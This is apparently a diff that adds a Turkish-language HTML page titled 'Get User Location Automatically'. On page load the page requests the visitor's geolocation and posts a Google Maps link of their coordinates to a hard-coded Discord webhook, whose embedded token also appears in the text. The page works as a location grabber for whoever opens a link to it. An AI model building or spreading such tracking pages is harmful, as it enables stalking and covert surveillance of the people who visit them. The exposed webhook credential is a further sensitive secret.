@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get User Location Automatically</title>
+</head>
+<body>
+    <h1>Kullanıcının Gerçek Konumu Alınıyor...</h1>
+
+    <script>
+        // Sayfa yüklendiğinde otomatik olarak çalışacak fonksiyon
+        window.onload = function() {
+            getLocation();
+        };
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("Geolocation tarayıcınız tarafından desteklenmiyor.");
+            }
+        }
+
+        function sendPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            
+            // Google Maps linki oluşturma
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            // Webhook URL'sini buraya ekleyin
+            const webhookUrl = "https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8";
+
+            const data = {
+                content: `Kullanıcının konumu:\n[Google Maps'te Gör](<${mapsUrl}>)`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    alert("Konum Discord'a Google Maps linki olarak gönderildi!");
+                } else {
+                    alert("Konum gönderilemedi.");
+                }
+            }).catch(error => {
+                alert("Bir hata oluştu: " + error);
+            });
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Kullanıcı konum isteğini reddetti.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Konum bilgisi mevcut değil.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Konum isteği zaman aşımına uğradı.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Bilinmeyen bir hata oluştu.");
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
